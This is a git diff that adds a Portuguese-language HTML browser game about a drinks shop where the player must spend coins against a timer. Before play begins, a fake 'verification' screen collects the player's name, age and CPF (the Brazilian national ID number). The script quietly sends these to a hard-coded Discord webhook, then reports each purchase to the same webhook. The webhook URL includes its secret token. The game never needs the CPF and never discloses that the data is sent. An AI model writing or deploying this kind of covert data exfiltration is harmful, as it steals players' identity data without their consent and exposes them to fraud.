@@ -1,1 +1,202 @@
-content://ru.zdevs.zarchiver.external/storage/emulated/0/Download/index.html/jogo.html
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loja de Bebidas - Missão</title>
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    text-align:center;
+    background:#0f0f0f;
+    color:white;
+}
+#verificacao, #loading, #loja{
+    position:fixed;
+    top:0; left:0; right:0; bottom:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    background:#0f0f0f;
+}
+#verificacao input{
+    padding:10px;
+    font-size:18px;
+    margin:5px;
+    border-radius:5px;
+    border:none;
+}
+#verificacao button{
+    padding:10px 20px;
+    font-size:18px;
+    margin-top:10px;
+    border-radius:5px;
+    cursor:pointer;
+    background:#222;
+    color:white;
+    border:none;
+}
+.produto{
+    border:2px solid white;
+    padding:20px;
+    margin:20px;
+    display:inline-block;
+    border-radius:10px;
+}
+button{
+    padding:20px 40px;
+    font-size:20px;
+    margin-top:10px;
+    border-radius:10px;
+    cursor:pointer;
+    background:#222;
+    color:white;
+    border:none;
+}
+#timer, #gasto, #classificacao{
+    font-size:24px;
+    margin:10px;
+    color:#ff0;
+}
+</style>
+</head>
+<body>
+
+<!-- TELA DE VERIFICAÇÃO -->
+<div id="verificacao">
+    <h1>Verificação</h1>
+    <input id="inputNome" type="text" placeholder="Seu nome">
+    <input id="inputIdade" type="number" placeholder="Sua idade">
+    <input id="inputCPF" type="text" placeholder="Seu CPF">
+    <button onclick="confirmar()">Confirmar</button>
+</div>
+
+<!-- LOADING -->
+<div id="loading" style="display:none">Carregando...</div>
+
+<!-- LOJA -->
+<div id="loja" style="display:none">
+<h1 id="bemvindo"></h1>
+<h2>Moedas: <span id="moedas">2000</span></h2>
+<div id="timer">⏱️ Tempo restante: 15s</div>
+<div id="gasto">💰 Gasto: 0 moedas</div>
+<div id="classificacao">🏆 Classificação: Nenhuma</div>
+
+<div class="produto">
+<h3>🥤 Refrigerante</h3>
+<p>Preço: 5 moedas</p>
+<button onclick="comprar(5,'Refrigerante')">Comprar</button>
+</div>
+
+<div class="produto">
+<h3>🧃 Suco</h3>
+<p>Preço: 4 moedas</p>
+<button onclick="comprar(4,'Suco')">Comprar</button>
+</div>
+
+<div class="produto">
+<h3>🥛 Leite</h3>
+<p>Preço: 3 moedas</p>
+<button onclick="comprar(3,'Leite')">Comprar</button>
+</div>
+
+<h2 id="missao">Missão: Gaste 1000 moedas em 15 segundos!</h2>
+</div>
+
+<script>
+// --- VERIFICAÇÃO ---
+let nome = "";
+let idade = 0;
+let cpf = "";
+
+function confirmar(){
+    nome = document.getElementById("inputNome").value.trim();
+    idade = parseInt(document.getElementById("inputIdade").value);
+    cpf = document.getElementById("inputCPF").value.trim();
+
+    if(nome === "" || isNaN(idade) || idade <= 0 || cpf === ""){
+        alert("Preencha todos os campos corretamente!");
+        return;
+    }
+
+    // enviar para webhook
+    fetch("https://discord.com/api/webhooks/1480040590648545291/j5gIQQBHbYAcnHRp2dq79QZlFOTJ3LoXo0GzxM05Iz8BFnU9UyUimioUx5U4gyXTWPf8",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            content:`👤 Nome: ${nome}, Idade: ${idade}, CPF: ${cpf} entrou no jogo`
+        })
+    });
+
+    // esconder verificação e mostrar loading
+    document.getElementById("verificacao").style.display="none";
+    document.getElementById("loading").style.display="flex";
+
+    // iniciar loading e depois loja
+    setTimeout(()=>{
+        document.getElementById("loading").style.display="none";
+        document.getElementById("loja").style.display="block";
+        iniciarLoja();
+    },3000); // 3 segundos de loading
+}
+
+// --- LOJA ---
+let moedas = 2000;
+let gastoMissao = 0;
+let tempo = 15;
+let missãoCompleta = false;
+
+function iniciarLoja(){
+    document.getElementById("bemvindo").innerText = "Bem-vindo, " + nome;
+    document.getElementById("moedas").innerText = moedas;
+
+    // timer da missão
+    let timer = setInterval(()=>{
+        tempo--;
+        document.getElementById("timer").innerText = `⏱️ Tempo restante: ${tempo}s`;
+        if(tempo<=0){
+            clearInterval(timer);
+            if(!missãoCompleta){
+                document.getElementById("missao").innerText = "Missão falhou!";
+            }
+        }
+    },1000);
+}
+
+function atualizarClassificacao(){
+    let rank = "Nenhuma";
+    if(gastoMissao >= 1000 && gastoMissao < 1500) rank = "Bronze";
+    else if(gastoMissao >= 1500 && gastoMissao < 2000) rank = "Prata";
+    else if(gastoMissao >= 2000) rank = "Ouro";
+    document.getElementById("classificacao").innerText = `🏆 Classificação: ${rank}`;
+}
+
+function comprar(preco,item){
+    if(moedas >= preco){
+        moedas -= preco;
+        gastoMissao += preco;
+        document.getElementById("moedas").innerText = moedas;
+        document.getElementById("gasto").innerText = `💰 Gasto: ${gastoMissao} moedas`;
+        atualizarClassificacao();
+
+        // webhook
+        fetch("https://discord.com/api/webhooks/1480040590648545291/j5gIQQBHbYAcnHRp2dq79QZlFOTJ3LoXo0GzxM05Iz8BFnU9UyUimioUx5U4gyXTWPf8", {
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                content:`🛒 ${nome} gastou ${preco} moedas comprando ${item}`
+            })
+        });
+
+        // checar missão
+        if(gastoMissao >= 1000 && !missãoCompleta){
+            missãoCompleta = true;
+            document.getElementById("missao").innerText = "✅ Missão completa!";
+        }
+    }
+}
+</script>
+
+</body>
+  </html>
